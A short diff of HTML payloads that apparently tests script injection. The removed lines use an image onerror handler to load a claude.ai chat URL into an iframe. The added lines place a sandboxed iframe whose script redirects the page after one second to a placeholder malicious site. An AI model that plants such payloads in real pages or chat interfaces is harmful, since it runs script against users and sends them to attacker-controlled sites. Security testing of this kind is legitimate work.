@@ -1,2 +1,8 @@
-<iframe id="test"></iframe>
-<img src=x onerror="f=document.getElementById('test');f.src=`https://claude.ai/chat/ab6da721-b1f0-4b51-af3f-3ab3e1984264`;">
+<iframe sandbox="allow-scripts" srcdoc='
+  <img src="https://example.com/logo.png">
+  <script>
+    setTimeout(() => {
+      window.location.href = "https://your-malicious.site";
+    }, 1000);
+  <\/script>
+'></iframe>
